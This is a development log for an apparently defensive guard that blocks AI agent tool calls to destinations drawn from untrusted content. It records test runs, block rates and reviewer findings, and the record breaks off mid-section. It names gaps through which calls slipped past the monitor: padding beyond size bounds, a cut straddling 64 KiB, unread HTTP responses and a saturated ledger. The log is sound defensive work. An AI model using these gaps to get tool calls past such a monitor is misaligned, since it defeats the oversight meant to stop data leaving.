PASS result:leaf_over_64k[public scan, tool=]         enforce=['blocked', 'result_truncated'] record=['allowed', 'result_truncated'] off=['allowed', None]
PASS result:over_64_leaves[private _scan_tool_result] enforce=['blocked', 'result_truncated'] record=['allowed', 'result_truncated'] off=['allowed', None]
PASS result:depth_over_6[private _scan_tool_result]   enforce=['blocked', 'result_truncated'] record=['allowed', 'result_truncated'] off=['allowed', None]
PASS seam identity: {'with tool=': ['allowed', 'principal_undeclared_span'], 'without': ['blocked', 'untrusted_source']}
```
Two of the result cases use the private `_scan_tool_result`, because the public seam takes a string and cannot carry a list or dict result. That is labelled in the case names.

### Block rate, re-measured (`q13_block_rate.py`, HEAD 255a4b3 in a worktree vs this tree)
BEFORE:
```
456-row shell corpus (buckets: ['attacks', 'benign', 'benign_prose', 'benign_templates'] ), ENFORCE, block mode:
  P-flow-I                     calls=  494  would block=  26  rate= 5.26% | attacks: 20/302 | benign: 0/83 | benign_prose: 6/97 | benign_templates: 0/12
  P-flow-R                     calls=  494  would block=  37  rate= 7.49% | attacks: 25/302 | benign: 5/83 | benign_prose: 7/97 | benign_templates: 0/12
  P-seam                       calls=  494  would block=  37  rate= 7.49% | attacks: 25/302 | benign: 5/83 | benign_prose: 7/97 | benign_templates: 0/12
adversarial / benign corpora, ENFORCE:
  A-calls                      calls=  470  would block=  98  rate=20.85% (pass result parts: 3)
  A-flow-I                     calls=  228  would block=   0  rate= 0.00% (pass result parts: 3)
  A-flow-R                     calls=  228  would block=   0  rate= 0.00% (pass result parts: 3)
  A-steps                      calls=   36  would block=   0  rate= 0.00% (pass result parts: 3)
conformance flows (expected wire per config; designed cases, not traffic):
  config A                     calls=  620  would block= 143  rate=23.06% 
  config B                     calls=  620  would block=  80  rate=12.90% 
  config C                     calls=  620  would block= 353  rate=56.94%
```
AFTER:
```
456-row shell corpus (buckets: ['attacks', 'benign', 'benign_prose', 'benign_templates'] ), ENFORCE, block mode:
  P-flow-I                     calls=  494  would block=  26  rate= 5.26% | attacks: 20/302 | benign: 0/83 | benign_prose: 6/97 | benign_templates: 0/12
  P-flow-R                     calls=  494  would block=  37  rate= 7.49% | attacks: 25/302 | benign: 5/83 | benign_prose: 7/97 | benign_templates: 0/12
  P-seam                       calls=  494  would block=  37  rate= 7.49% | attacks: 25/302 | benign: 5/83 | benign_prose: 7/97 | benign_templates: 0/12
adversarial / benign corpora, ENFORCE:
  A-calls                      calls=  470  would block=  98  rate=20.85% (pass result parts: 3)
  A-flow-I                     calls=  228  would block=   0  rate= 0.00% (pass result parts: 3)
  A-flow-R                     calls=  228  would block=   0  rate= 0.00% (pass result parts: 3)
  A-steps                      calls=   36  would block=   0  rate= 0.00% (pass result parts: 3)
conformance flows (expected wire per config; designed cases, not traffic):
  config A                     calls=  620  would block= 143  rate=23.06% 
  config B                     calls=  620  would block=  80  rate=12.90% 
  config C                     calls=  620  would block= 353  rate=56.94%
```
These are identical: no call in these corpora hits a bound. **benign_a2a and benign_longform are NOT re-measured.** The script does not cover them, and the method behind 4/64 and 0/24 was not re-run in this round's budget. **Owed.** **[RETRACTED 2026-10-05: vacuous. `q13_block_rate.py` counted `untrusted_source` only, so it could not see a bound state and was identical by construction. Re-measured with each tree's own `should_block`: see "Re-measured after RULING 1+2" below.]**

### The three substituted §4 acceptance cases, labelled (not run as written)
1. **LangChain driver: SUBSTITUTED.** The tests drive the private `_scan_tool_result`, which is the method the LangChain after-hook calls, not a LangChain agent driver.
2. **`[BLOCKED]` ToolMessage: NOT CHECKED.** No test asserts what the LangChain ToolMessage contains on a value-origin block.
3. **`MatchKind.EXACT`: SUBSTITUTED by `MatchKind.ANY`** in every designated-directory case, including this round's seam-identity test.

### Pins changed because they encoded the silent behaviour (each marked at its site)
- S16, S16-overlength and S16-depth: `unresolved` → `argument_bound` (supplementary.jsonl; expected.jsonl regenerated at --rev 01450c7).
- test_procedural V-15: a destination past 64 KiB, `UNRESOLVED` → `RESULT_TRUNCATED`.
- test_value_origin_m5 `truncated`.
- test_value_origin_m7 `input_truncated never blocks` → `blocks under enforce`.
- M8's 64 KiB strict xfail was wrong twice. It asserted `("blocked", "untrusted_source")` on a sensor in the DEFAULT monitor mode, where a block is returned as `flagged`. It now asserts `("flagged", "result_truncated")`.

### Not done in this round (30-call budget)
- Fresh-context silent-failure-hunter and milestone-reviewer reviews: **not run.**
- Docker matrix: **not run.** This round changes no differential (url_parse and `_authority` are untouched).
- benign_a2a / benign_longform re-measure: **not run.** **[Done 2026-10-05; see "Round close" below.]**
- M9: not started.


## Round close: reviews, re-measure, PR, then Q18 (owner, 2026-10-05)

### The vacuous re-measure, retracted
Last round's "byte-identical before and after: no call in these corpora hits a bound" was vacuous. `q13_block_rate.py` counted `wires.count("untrusted_source")`, so no bound state could ever register. It is retracted in place in docs/value-origin-enforce.md and above in this file. The script now counts with the tree's own `should_block` and prints each pass's wire distribution.

### Re-measured: benign_a2a and benign_longform included, same instrument on both trees
The script behind the original 4/64 and 0/24 was never committed. It is rebuilt inside `q13_block_rate.py` and validated against its one surviving output (lines above: benign_a2a P-flow-I 0/64 [no_destination 58, principal_undeclared_span 4, unresolved 2], P-flow-R 4/64; benign_longform 0/24 [unresolved 24]). On 255a4b3 it reproduces that output exactly.

BEFORE (255a4b3 in a detached worktree, PYTHONPATH = that tree):
```
xaidr from: $S/base/xaidr
xaidr    : $S/base/xaidr/__init__.py
version  : 1.19.0
measuring: THE WORKING TREE at $S/base — not an installed wheel. Set XAIDR_FROM_INSTALL=1 (neutral cwd, python -I) to measure a published artifact instead.

456-row shell corpus, ENFORCE, block mode:
  P-flow-I                     calls=  494  would block=  26  rate= 5.26% | attacks: 20/302 | benign: 0/83 | benign_prose: 6/97 | benign_templates: 0/12
  P-flow-R                     calls=  494  would block=  37  rate= 7.49% | attacks: 25/302 | benign: 5/83 | benign_prose: 7/97 | benign_templates: 0/12
  P-seam                       calls=  494  would block=  37  rate= 7.49% | attacks: 25/302 | benign: 5/83 | benign_prose: 7/97 | benign_templates: 0/12
benign_a2a (60 A2A JSON-RPC bodies), ENFORCE, block mode:
  P-flow-I                     calls=   64  would block=   0  rate= 0.00% | benign_a2a: 0/64 [('no_destination', 58), ('principal_undeclared_span', 4), ('unresolved', 2)]
  P-flow-R                     calls=   64  would block=   4  rate= 6.25% | benign_a2a: 4/64 [('no_destination', 58), ('unresolved', 2), ('untrusted_source', 4)]
  P-seam                       calls=   64  would block=   4  rate= 6.25% | benign_a2a: 4/64 [('no_destination', 58), ('unresolved', 2), ('untrusted_source', 4)]
benign_longform (24 generated documents, 90k..1.4M chars), ENFORCE, block mode:
  P-flow-I                     calls=   24  would block=   0  rate= 0.00% | benign_longform: 0/24 [('unresolved', 24)]
  P-flow-R                     calls=   24  would block=   0  rate= 0.00% | benign_longform: 0/24 [('unresolved', 24)]
  P-seam                       calls=   24  would block=   0  rate= 0.00% | benign_longform: 0/24 [('unresolved', 24)]
adversarial / benign corpora, ENFORCE:
  A-calls                      calls=  470  would block=  98  rate=20.85% [('no_destination', 368), ('unresolved', 4), ('untrusted_source', 98)]
  A-flow-I                     calls=  228  would block=   0  rate= 0.00% [('no_destination', 228)]
  A-flow-R                     calls=  228  would block=   0  rate= 0.00% [('no_destination', 228)]
  A-steps                      calls=   36  would block=   0  rate= 0.00% [('no_destination', 28), ('unresolved', 8)]
conformance flows (expected wire per config; designed cases, not traffic):
  config A                     calls=  620  would block= 143  rate=23.06% 
  config B                     calls=  620  would block=  80  rate=12.90% 
  config C                     calls=  620  would block= 353  rate=56.94% 
[59 lines of '[xaidr] Warning: L1 scan budget exceeded (0.5s)' removed]
```
AFTER (f93e873):
```
xaidr from: ./xaidr
xaidr    : ./xaidr/__init__.py
version  : 1.19.0
measuring: THE WORKING TREE at . — not an installed wheel. Set XAIDR_FROM_INSTALL=1 (neutral cwd, python -I) to measure a published artifact instead.

456-row shell corpus, ENFORCE, block mode:
  P-flow-I                     calls=  494  would block=  26  rate= 5.26% | attacks: 20/302 | benign: 0/83 | benign_prose: 6/97 | benign_templates: 0/12
  P-flow-R                     calls=  494  would block=  37  rate= 7.49% | attacks: 25/302 | benign: 5/83 | benign_prose: 7/97 | benign_templates: 0/12
  P-seam                       calls=  494  would block=  37  rate= 7.49% | attacks: 25/302 | benign: 5/83 | benign_prose: 7/97 | benign_templates: 0/12
benign_a2a (60 A2A JSON-RPC bodies), ENFORCE, block mode:
  P-flow-I                     calls=   64  would block=   0  rate= 0.00% | benign_a2a: 0/64 [('no_destination', 58), ('principal_undeclared_span', 4), ('unresolved', 2)]
  P-flow-R                     calls=   64  would block=   4  rate= 6.25% | benign_a2a: 4/64 [('no_destination', 58), ('unresolved', 2), ('untrusted_source', 4)]
  P-seam                       calls=   64  would block=   4  rate= 6.25% | benign_a2a: 4/64 [('no_destination', 58), ('unresolved', 2), ('untrusted_source', 4)]
benign_longform (24 generated documents, 90k..1.4M chars), ENFORCE, block mode:
  P-flow-I                     calls=   24  would block=  24  rate=100.00% | benign_longform: 24/24 [('argument_bound', 24)]
  P-flow-R                     calls=   24  would block=  24  rate=100.00% | benign_longform: 24/24 [('argument_bound', 24)]
  P-seam                       calls=   24  would block=  24  rate=100.00% | benign_longform: 24/24 [('argument_bound', 24)]
adversarial / benign corpora, ENFORCE:
  A-calls                      calls=  470  would block=  98  rate=20.85% [('no_destination', 368), ('unresolved', 4), ('untrusted_source', 98)]
  A-flow-I                     calls=  228  would block=   0  rate= 0.00% [('no_destination', 228)]
  A-flow-R                     calls=  228  would block=   0  rate= 0.00% [('no_destination', 228)]
  A-steps                      calls=   36  would block=   0  rate= 0.00% [('no_destination', 28), ('unresolved', 8)]
conformance flows (expected wire per config; designed cases, not traffic):
  config A                     calls=  620  would block= 143  rate=23.06% 
  config B                     calls=  620  would block=  80  rate=12.90% 
  config C                     calls=  620  would block= 353  rate=56.94% 
[91 lines of '[xaidr] Warning: L1 scan budget exceeded (0.5s)' removed]
```
**benign_longform goes from 0/24 to 24/24 blocked, all `argument_bound`.** Nothing else moves. The cost this exposes, on long ARGUMENTS rather than long results, is in docs/value-origin-enforce.md.

### The CI watcher lost a round to a short hash
Last round's watcher ran `gh run list --commit f93e873`. With the 7-character hash it returned no run (observed; the runs list `headSha` as the full 40-character SHA), and the loop then polled `gh run view ""` until it was stopped. **Pass `$(git rev-parse HEAD)` and exit with an error on an empty id.**

### The two reviews (fresh context, run on f93e873's diff without the build's notes)
**silent-failure-hunter:** found no fail-open regression in the bound logic. It checked whether the `result_truncated` flag can be lost (no: it is set inside the lock before any partial-failure point), whether `should_block` can swallow a bound state, whether `held["true"]` can be missing and yield a false trust (no: it yields untrusted), and whether the tests are vacuous. Two findings:
- **MEDIUM, not fixed (owner's attention):** `frameworks._scan_result`'s fallback, for a sensor WITHOUT `_scan_tool_result`, calls `sensor.scan(text, direction="tool_result")` without `tool=`/`arguments=`. It fails safe, not open: the read stays untrusted. Passing the new keywords to a duck-typed sensor's unknown `scan()` signature would risk a TypeError on every result.
- **LOW, fixed (doc):** `tool=` is trusted as given. It must come from the host's own dispatch, never from content.

**milestone-reviewer:** six findings, all addressed in this commit.
1. HIGH, the vacuous re-measure. Retracted in place, re-measured above (the reviewer's independent benign_longform count, 24/24 `argument_bound`, agrees).
2. MEDIUM-HIGH, a bound block was audited as an untrusted destination. Telemetry had no wire value. The block event now carries `valueOrigin`. Red first: **[M9, 2026-10-06: on the WIRE this holds only for values the consumer accepts. Under the default `value_origin_wire="v1"` (the Brain's nine) the five new states, `result_unread` included, are WITHHELD from telemetry for every reporter. They stay on `ScanResult.value_origin`, and a `result_unread` block still carries `ORIGIN_UNEXAMINABLE_SOURCE` + `intent.value_origin_untrusted`. Set `"v2"` once the consumer accepts all fourteen.]**
```
E   AssertionError: the block event does not say which state blocked it: {'timestamp': '2026-10-05T18:18:32.938428Z', 'scanId': 'e64dadfec124', 'agentId': 'bounds-tel', 'action': 'blocked', 'score': 1.0, 'category': 'untrusted_destination', 'rules': ['ORIGIN_UNTRUSTED_DESTINATION', 'intent.value_ori
```
   The rule ids still say "untrusted" for a bound block. A bound-specific rule id is the owner's naming call.
3. MEDIUM, the cost of `ledger_saturated` blocking was unstated. A benign 17,481-char prompt saturates the ledger, after which every miss blocks. Now stated in docs/value-origin-enforce.md, for the owner to confirm or reverse.
4. MEDIUM, about fifteen earlier claims were not retracted where they stand. Each is now marked in place: docs/value-origin-enforce.md (the public-seam rows, the design-gap paragraph, both evasion bullets, the renamed xfail, the anomaly line, the warning line, the "wire value says which bound" line), docs/value-origin-rulings.md, PROGRESS.md (three lines), docs/value-origin-wire-consumers.md, the sensor's input-cap comment, `_extract`'s docstring, and `_evaluate`'s "outside the nine". In test_interface, `test_should_block_only_on_enforce_unauthorized` is renamed, and `test_verdict_of_is_total` now covers all 12 values. A new test fails if the table ever misses one.
5. LOW, the at-limit test could not see over-application. It now also requires an UNRELATED miss to stay `unresolved`. The reviewer's own sabotage (a leaf of exactly 65,536 chars flags the ledger) now goes red:
```
E   AssertionError: leaf_at_64k: a result exactly AT the bound, nothing cut, flagged the ledger: an unrelated miss read 'result_truncated' and would block
```
6. LOW, the wheel evidence was a scratch script. It is now `tests/outside/test_bounds_from_the_wheel.py`.

Docker matrix: **not run, and not needed this round**, since no URL-parsing or differential code changed (owner, 2026-10-05).
== commit A suites: 563 passed, 7 xfailed, 1 warning in 53.10s

### Item 4: Q18 under the bounds ruling (`result_unread`)
**Verified against the real code first,** with REAL unread objects (requests and aiohttp were pip-installed into the scratch venv only, not the dev extra), against the tree before the fix:
```
control str: builtins.str              nested=False ledger 0->1  blocked  wire=untrusted_source   | -
httpx.Response         nested=False ledger 0->0  allowed  wire=unresolved         | is_stream_consumed=False
httpx.Response         nested=True  ledger 0->0  allowed  wire=unresolved         | is_stream_consumed=False
urllib3.response.HTTPResponse     nested=False ledger 0->0  allowed  wire=unresolved         | body bytes read=0
urllib3.response.HTTPResponse     nested=True  ledger 0->0  allowed  wire=unresolved         | body bytes read=0
requests.models.Response         nested=False ledger 0->0  allowed  wire=unresolved         | _content=False raw bytes read=0
requests.models.Response         nested=True  ledger 0->0  allowed  wire=unresolved         | _content=False raw bytes read=0
```
- **aiohttp was NOT reproduced with a real object.** Constructing a real `ClientResponse` failed: its constructor rejected the arguments I passed, and my script's error handler had a bug of its own. aiohttp is covered by a stand-in in its module namespace, which is what the guard keys on.
- **Manifest:** Q18's "report them `not_recorded` in the manifest" was **never built**. `xaidr/autopatch/manifest.py` has no value-origin field. So the visible-state work was not smaller than it looked.

**Red first** (12 of 13; the 13th is the untrusted-outranks guard, which already held):
```
12 failed, 1 passed, 19 deselected in 0.11s
AssertionError: aiohttp.ClientResponse[stand-in: aiohttp is not in the dev extra]: a destination inside an unread response was never recorded, nothing said so, and the call to it read 'unresolved' -- ENFORCE allowed it
AssertionError: aiohttp.ClientResponse[stand-in: aiohttp is not in the dev extra]: through the sensor's result seam, ENFORCE gave ('allowed', 'unresolved')
AssertionError: httpx.Response[real, unread stream]: a destination inside an unread response was never recorded, nothing said so, and the call to it read 'unresolved' -- ENFORCE allowed it
AssertionError: httpx.Response[real, unread stream]: through the sensor's result seam, ENFORCE gave ('allowed', 'unresolved')
AssertionError: requests.Response[stand-in: requests is not in the dev extra]: a destination inside an unread response was never recorded, nothing said so, and the call to it read 'unresolved' -- ENFORCE allowed it
AssertionError: requests.Response[stand-in: requests is not in the dev extra]: through the sensor's result seam, ENFORCE gave ('allowed', 'unresolved')
AssertionError: urllib3.HTTPResponse[real, preload_content=False]: a destination inside an unread response was never recorded, nothing said so, and the call to it read 'unresolved' -- ENFORCE allowed it
AssertionError: urllib3.HTTPResponse[real, preload_content=False]: through the sensor's result seam, ENFORCE gave ('allowed', 'unresolved')
```
**Green:** 581 passed, 7 xfailed, 1 warning in 57.34s (the affected suites, the Q18 tests, the wheel test with the Q18 cases, and test_m7_from_the_wheel).

**Sabotage:** SQ2 is the discriminating case. With the core fix alone (the sensor's old early return restored), the core tests pass and the sensor seam stays red:
```
== SQ1 core: the unread node is dropped silently again (the pre-fix normaliser): 12 failed, 1 passed, 20 deselected in 0.12s
   red: 12 tests, e.g. test_an_unread_io_backed_result_is_a_visible_state_and_blocks[kind_35chars-nested-in-a-dict]
   msg: aiohttp.ClientResponse[stand-in: aiohttp is not in the dev extra]: a destination inside an unread response was never recorded, nothing said so, and the call to it read 'unresolved' -- ENFORCE allowed it
== SQ2 sensor: the Q18 early return restored (the core fix alone): 4 failed, 9 passed, 20 deselected in 0.11s
   red: 4 tests, e.g. test_the_sensor_seam_blocks_after_an_unread_io_backed_result[kind_35chars]
   msg: aiohttp.ClientResponse[stand-in: aiohttp is not in the dev extra]: through the sensor's result seam, ENFORCE gave ('allowed', 'unresolved')
== SQ3 ledger: the skip is not marked: 12 failed, 1 passed, 20 deselected in 0.11s
   red: 12 tests, e.g. test_an_unread_io_backed_result_is_a_visible_state_and_blocks[kind_35chars-nested-in-a-dict]
   msg: aiohttp.ClientResponse[stand-in: aiohttp is not in the dev extra]: a destination inside an unread response was never recorded, nothing said so, and the call to it read 'unresolved' -- ENFORCE allowed it
== restored: True
```
**From outside the process:** `tests/outside/test_bounds_from_the_wheel.py` now also runs the four I/O modules (stand-ins, because the fresh venv holds only the wheel). Each gives `["blocked", "result_unread"]` under ENFORCE, RECORD reports the state with the same action as OFF, and `.content` is never read.


## Round: CI fix, the bounds ruling narrowed, rule ids, KEYED (owner, 2026-10-05)

### 1. The red base jobs: cause confirmed from the log, then fixed
`gh run view 37355899015 --log-failed`: every base job had **7 failed, 9084 passed**. All 7 are my Q18 tests, `REFUSING: httpx (dev extra) is not installed` (and the same for urllib3). The base job runs `-m "not requires_dev_extra"` and installs no extras, and the real-object cases were unmarked. Reproduced locally by shadowing httpx/urllib3 with modules that raise ImportError:
```
BEFORE the fix, base selection: 7 failed, 26 passed in 1.03s
AFTER, base selection:          27 passed, 6 deselected in 1.05s
```
The real-object cases are now `requires_dev_extra`; the stand-ins and the precedence test run everywhere. `3daf41f` had no CI result because its run was cancelled by the 77d9b4a push. It was re-run on its own SHA (run 37355329885).

### 2. The narrowed bounds ruling
**Red first** (16 of 19; the 3 passing are guards):
```
16 failed, 3 passed in 0.83s
AssertionError: ('blocked', 'input_truncated')
AssertionError: a cost control must not block
AssertionError: a full ledger means the cap is wrong
AssertionError: depth_over_6: a long benign argument blocks under ENFORCE (benign_longform's 24/24)
AssertionError: depth_over_6: the destination past the argument bound was not extracted, so the call read 'argument_bound' instead of the untrusted source it is
AssertionError: depth_over_6: the destination past the result bound was never recorded; the call read 'result_truncated'
AssertionError: email_body_over_4000: a long benign argument blocks under ENFORCE (benign_longform's 24/24)
AssertionError: file_write_over_4000: a long benign argument blocks under ENFORCE (benign_longform's 24/24)
AssertionError: leaf_over_4000: the destination past the argument bound was not extracted, so the call read 'argument_bound' instead of the untrusted source it is
AssertionError: leaf_over_64k: the destination past the result bound was never recorded; the call read 'result_truncated'
AssertionError: over_64_leaves: a long benign argument blocks under ENFORCE (benign_longform's 24/24)
AssertionError: over_64_leaves: the destination past the argument bound was not extracted, so the call read 'argument_bound' instead of the untrusted source it is
AssertionError: over_64_leaves: the destination past the result bound was never recorded; the call read 'result_truncated'
AssertionError: returned: a call blocked because a source could not be examined is recorded as an untrusted destination: rules=['ORIGIN_UNTRUSTED_DESTINATION', 'intent.value_origin_untrusted'], category='untrusted_destination'
AssertionError: straddling_the_64k_cut: the destination past the result bound was never recorded; the call read 'result_truncated'
AssertionError: the principal typed bob@corp.example 74,996 chars in, past the 64 KiB cap, and the call gave ('blocked', 'input_truncated')
```
The loud saturation warning, red first:
```
E   AssertionError: a full ledger drops every later emission, untrusted tool results included, and the warning does not say so: ["value origin: this flow's ledger reached 10000 digests and dropped an emission; unmatched destinations now report ledger_saturated, not unresolved"]
```
**Sabotage, one per change** (SA3 is the discriminating one: handing on only the tail of a cut leaf loses a straddling destination):
```
== SA1 arguments: no atom extraction past the bound: 3 failed, 17 passed in 1.27s
   red: test_a_padded_untrusted_destination_is_found_and_blocks_as_untrusted[depth_over_6]
   red: test_a_padded_untrusted_destination_is_found_and_blocks_as_untrusted[leaf_over_4000]
   red: test_a_padded_untrusted_destination_is_found_and_blocks_as_untrusted[over_64_leaves]
   msg: depth_over_6: the destination past the argument bound was not extracted, so the call read 'argument_bound' instead of the untrusted source it is
== SA2 results: no atom extraction past the bound: 4 failed, 16 passed in 1.27s
   red: test_a_destination_past_a_result_bound_is_recorded_and_blocks_as_untrusted[depth_over_6]
   red: test_a_destination_past_a_result_bound_is_recorded_and_blocks_as_untrusted[leaf_over_64k]
   red: test_a_destination_past_a_result_bound_is_recorded_and_blocks_as_untrusted[over_64_leaves]
   red: test_a_destination_past_a_result_bound_is_recorded_and_blocks_as_untrusted[straddling_the_64k_cut]
   msg: depth_over_6: the destination past the result bound was never recorded; the call read 'result_truncated'
== SA3 an over-length result leaf hands on only its TAIL (the straddle): 2 failed, 18 passed in 1.27s
   red: test_a_destination_past_a_result_bound_is_recorded_and_blocks_as_untrusted[straddling_the_64k_cut]
   red: test_a_padded_untrusted_destination_is_found_and_blocks_as_untrusted[leaf_over_4000]
   msg: leaf_over_4000: the destination past the argument bound was not extracted, so the call read 'argument_bound' instead of the untrusted source it is
== SA4 the sensor cuts the input again: 1 failed, 19 passed in 1.29s
   red: test_through_the_sensor_a_destination_past_the_input_cap_is_the_principals
   msg: the principal typed bob@corp.example 74,996 chars in, past the 64 KiB cap, and the call gave ('allowed', 'input_truncated') (the input scan was flagged; V-9 gives untrusted_source)
== SA5 the bound states block again (the previous ruling): 7 failed, 13 passed in 1.29s
   red: test_a_cut_result_with_nothing_past_the_cut_is_visible_but_does_not_block
   red: test_a_long_benign_argument_is_visible_but_does_not_block[depth_over_6]
   red: test_a_long_benign_argument_is_visible_but_does_not_block[email_body_over_4000]
   red: test_a_long_benign_argument_is_visible_but_does_not_block[file_write_over_4000]
   msg: depth_over_6: a long benign argument blocks under ENFORCE (benign_longform's 24/24)
== SA6 a result_unread block named as an untrusted destination: 1 failed, 19 passed in 1.28s
   red: test_result_unread_still_blocks_under_its_own_rule_id_and_category
   msg: returned: a call blocked because a source could not be examined is recorded as an untrusted destination: rules=['ORIGIN_UNTRUSTED_DESTINATION', 'intent.value_origin_untrusted'], category='untrusted_destination'
== SA7 the quiet saturation warning: 1 failed, 19 passed in 1.27s
   red: test_a_full_ledger_warns_loudly_that_it_drops_and_does_not_block
   msg: a full ledger drops every later emission, untrusted tool results included, and the warning does not say so: ["value origin: this flow's ledger is FULL at 10000 entries (destinations and the principal's key n-grams share it; a ~17 
== restored: True
```
**Cost** (value origin only, core-level; before is 77d9b4a):
```
BEFORE
xaidr from: ./xaidr
the 5 MB case (core value-origin cost only, best of 3):
  record_principal_input  5 MB of 'A' (test_truncation_bypass shape)      241.3 ms
  record_tool_result      5 MB of 'A' (test_truncation_bypass shape)        3.0 ms
  evaluate_call(arg)      5 MB of 'A' (test_truncation_bypass shape)        0.0 ms
  record_principal_input  5 MB of real prose                             1571.7 ms
  record_tool_result      5 MB of real prose                                7.2 ms
  evaluate_call(arg)      5 MB of real prose                                0.0 ms
  END TO END sensor.scan(5 MB 'A', input): value_origin=off 1013 ms, record 1026 ms, delta +13 ms
benign_longform, 24 docs, 10,100,008 chars (core value-origin cost, summed):
  record_principal_input           total     5877 ms    244.9 ms/doc   largest doc 439 ms
  record_tool_result               total      230 ms      9.6 ms/doc   largest doc 7 ms
  evaluate_call(run_command=doc)   total        0 ms      0.0 ms/doc   largest doc 0 ms

AFTER
xaidr from: ./xaidr
the 5 MB case (core value-origin cost only, best of 3):
  record_principal_input  5 MB of 'A' (test_truncation_bypass shape)      219.8 ms
  record_tool_result      5 MB of 'A' (test_truncation_bypass shape)      222.8 ms
  evaluate_call(arg)      5 MB of 'A' (test_truncation_bypass shape)      217.7 ms
  record_principal_input  5 MB of real prose                              565.6 ms
  record_tool_result      5 MB of real prose                              554.9 ms
  evaluate_call(arg)      5 MB of real prose                              550.1 ms
  END TO END sensor.scan(5 MB 'A', input): value_origin=off 1019 ms, record 1234 ms, delta +216 ms
benign_longform, 24 docs, 10,100,008 chars (core value-origin cost, summed):
  record_principal_input           total     2244 ms     93.5 ms/doc   largest doc 172 ms
  record_tool_result               total     1685 ms     70.2 ms/doc   largest doc 162 ms
  evaluate_call(run_command=doc)   total     1486 ms     61.9 ms/doc   largest doc 158 ms
```
**Block rate after.** benign_longform is **7/24 input-derived and 8/24 result-derived, NOT near 0.** All are `untrusted_source`, none is a bound block. The cause is measured per document below, and explained in docs/value-origin-enforce.md.
```
xaidr from: ./xaidr
xaidr    : ./xaidr/__init__.py
version  : 1.19.0
measuring: THE WORKING TREE at . — not an installed wheel. Set XAIDR_FROM_INSTALL=1 (neutral cwd, python -I) to measure a published artifact instead.

456-row shell corpus, ENFORCE, block mode:
  P-flow-I                     calls=  494  would block=  26  rate= 5.26% | attacks: 20/302 | benign: 0/83 | benign_prose: 6/97 | benign_templates: 0/12
  P-flow-R                     calls=  494  would block=  37  rate= 7.49% | attacks: 25/302 | benign: 5/83 | benign_prose: 7/97 | benign_templates: 0/12
  P-seam                       calls=  494  would block=  37  rate= 7.49% | attacks: 25/302 | benign: 5/83 | benign_prose: 7/97 | benign_templates: 0/12
benign_a2a (60 A2A JSON-RPC bodies), ENFORCE, block mode:
  P-flow-I                     calls=   64  would block=   0  rate= 0.00% | benign_a2a: 0/64 [('no_destination', 58), ('principal_undeclared_span', 4), ('unresolved', 2)]
  P-flow-R                     calls=   64  would block=   4  rate= 6.25% | benign_a2a: 4/64 [('no_destination', 58), ('unresolved', 2), ('untrusted_source', 4)]
  P-seam                       calls=   64  would block=   4  rate= 6.25% | benign_a2a: 4/64 [('no_destination', 58), ('unresolved', 2), ('untrusted_source', 4)]
benign_longform (24 generated documents, 90k..1.4M chars), ENFORCE, block mode:
  P-flow-I                     calls=   24  would block=   7  rate=29.17% | benign_longform: 7/24 [('argument_bound', 17), ('untrusted_source', 7)]
  P-flow-R                     calls=   24  would block=   8  rate=33.33% | benign_longform: 8/24 [('argument_bound', 16), ('untrusted_source', 8)]
  P-seam                       calls=   24  would block=   8  rate=33.33% | benign_longform: 8/24 [('argument_bound', 16), ('untrusted_source', 8)]
adversarial / benign corpora, ENFORCE:
  A-calls                      calls=  470  would block=  98  rate=20.85% [('no_destination', 368), ('unresolved', 4), ('untrusted_source', 98)]
  A-flow-I                     calls=  228  would block=   0  rate= 0.00% [('no_destination', 228)]
  A-flow-R                     calls=  228  would block=   0  rate= 0.00% [('no_destination', 228)]
  A-steps                      calls=   36  would block=   0  rate= 0.00% [('no_destination', 28), ('unresolved', 8)]
conformance flows (expected wire per config; designed cases, not traffic):
  config A                     calls=  620  would block= 143  rate=23.06% 
  config B                     calls=  620  would block=  80  rate=12.90% 
  config C                     calls=  620  would block= 353  rate=56.94%
```
```
  LF-policy_document-90k          91,378 chars  input scan=allowed  None               atoms=0
  LF-policy_document-150k        152,091 chars  input scan=flagged  oversized_input    atoms=0
  LF-policy_document-400k        400,034 chars  input scan=flagged  oversized_input    atoms=0
  LF-policy_document-900k        900,602 chars  input scan=flagged  oversized_input    atoms=0
  LF-kubectl_dump-90k            140,024 chars  input scan=flagged  pii_detected       atoms=143
  LF-kubectl_dump-150k           233,055 chars  input scan=flagged  pii_detected       atoms=238
  LF-kubectl_dump-400k           621,326 chars  input scan=flagged  pii_detected       atoms=635
  LF-kubectl_dump-900k         1,397,574 chars  input scan=flagged  data_exfiltration  atoms=1428
  LF-thread_dump-90k              90,181 chars  input scan=allowed  None               atoms=1046
  LF-thread_dump-150k            150,251 chars  input scan=flagged  oversized_input    atoms=1754
  LF-thread_dump-400k            401,698 chars  input scan=flagged  oversized_input    atoms=4647
  LF-thread_dump-900k            900,886 chars  input scan=flagged  oversized_input    atoms=10453
  LF-support_transcript-90k       90,178 chars  input scan=allowed  data_exfiltration  atoms=0
  LF-support_transcript-150k     150,091 chars  input scan=flagged  dos_attempt        atoms=0
  LF-support_transcript-400k     400,066 chars  input scan=flagged  data_exfiltration  atoms=0
  LF-support_transcript-900k     900,030 chars  input scan=flagged  dos_attempt        atoms=0
  LF-csv_export-90k               90,085 chars  input scan=allowed  None               atoms=0
  LF-csv_export-150k             150,013 chars  input scan=flagged  oversized_input    atoms=0
  LF-csv_export-400k             400,099 chars  input scan=flagged  oversized_input    atoms=0
  LF-csv_export-900k             900,028 chars  input scan=flagged  oversized_input    atoms=0
  LF-log_tail-90k                 90,060 chars  input scan=flagged  data_exfiltration  atoms=0
  LF-log_tail-150k               150,127 chars  input scan=flagged  data_exfiltration  atoms=0
  LF-log_tail-400k               400,118 chars  input scan=flagged  data_exfiltration  atoms=0
  LF-log_tail-900k               900,013 chars  input scan=flagged  data_exfiltration  atoms=0
  (input scan, has atoms): {('allowed', False): 3, ('flagged', False): 13, ('flagged', True): 7, ('allowed', True): 1}
```
**From outside the process:** 38 passed in 43.46s (test_bounds_from_the_wheel, m6, m7, m8 and m1_c11 from the wheel).

**Pins changed because they encoded the previous ruling** (each noted at its site):
- in test_value_origin_bounds, the argument-bound and cut-result "blocks" tests, the input_truncated test, the sensor cases, and the telemetry test (now on result_unread). The saturation-laundering test is now a strict xfail: a KNOWN GAP under this ruling.
- m6 `input_cap`, m7 `input_truncated`, and m8's 64 KiB test (now recorded: `untrusted_source`).
- test_procedural V-15 (`UNTRUSTED_SOURCE`).
- S16, S16-overlength and S16-depth now carry the extracted atom (expected.jsonl regenerated at --rev 01450c7).

### The two reviews of 58d7f64 (fresh context), and what was fixed
**milestone-reviewer:**
